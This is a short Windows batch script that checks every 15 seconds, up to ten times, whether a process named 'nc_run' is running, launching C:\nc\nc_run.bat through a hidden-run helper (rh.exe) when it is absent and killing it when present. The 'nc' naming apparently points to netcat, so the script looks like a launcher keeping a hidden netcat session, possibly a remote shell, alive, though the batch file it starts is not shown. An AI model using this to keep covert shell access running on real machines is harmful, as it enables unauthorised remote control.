@echo off
set loop=0
:loop




tasklist | find /I "nc_run" 
if errorlevel 1 (
        C:\nc\rh.exe C:\nc\nc_run.bat
) Else (
        taskkill /f /t /im nc_run.bat
)

timeout 15


set /a loop=%loop%+1 
if "%loop%"=="10" goto end
goto loop

:end
